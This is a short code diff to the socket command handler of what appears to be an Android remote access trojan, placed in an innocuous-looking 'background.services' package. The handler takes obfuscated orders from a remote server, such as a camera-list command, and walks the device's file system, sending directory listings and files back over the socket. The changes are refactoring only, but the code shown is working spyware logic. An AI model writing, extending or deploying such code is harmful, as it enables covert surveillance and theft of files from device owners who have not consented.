@@ -1,29 +1,26 @@
 package com.android.background.services;
 
-import android.app.Activity;
+import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Looper;
 import android.util.Log;
-import android.widget.Toast;
 
 import org.apache.commons.io.FileUtils;
-import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.File;
-import java.io.IOException;
 
 import io.socket.emitter.Emitter;
 
 public class ConnectionManager {
 
+    @SuppressLint("StaticFieldLeak")
     public static Context context;
     private static io.socket.client.Socket ioSocket;
-    private static FileManager fm = new FileManager();
 
     public static void startAsync(Context con) {
         try {
@@ -56,10 +53,13 @@ public class ConnectionManager {
             ioSocket.on("order", new Emitter.Listener() {
                 @Override
                 public void call(Object... args) {
+
                     try {
                         JSONObject data = (JSONObject) args[0];
                         String order = data.getString("order");
+
                         Log.d("order", order);
+
                         switch (order) {
                             case "x0000ca":
                                 if (data.getString("extra").equals("camList"))
@@ -294,9 +294,9 @@ public class ConnectionManager {
 
     public static void x0000fm(int req, String path) {
         if (req == 0)
-            ioSocket.emit("x0000fm", fm.walk(path));
+            ioSocket.emit("x0000fm", FileManager.walk(path));
         else if (req == 1)
-            fm.downloadFile(path);
+            FileManager.downloadFile(path);
     }
 
 
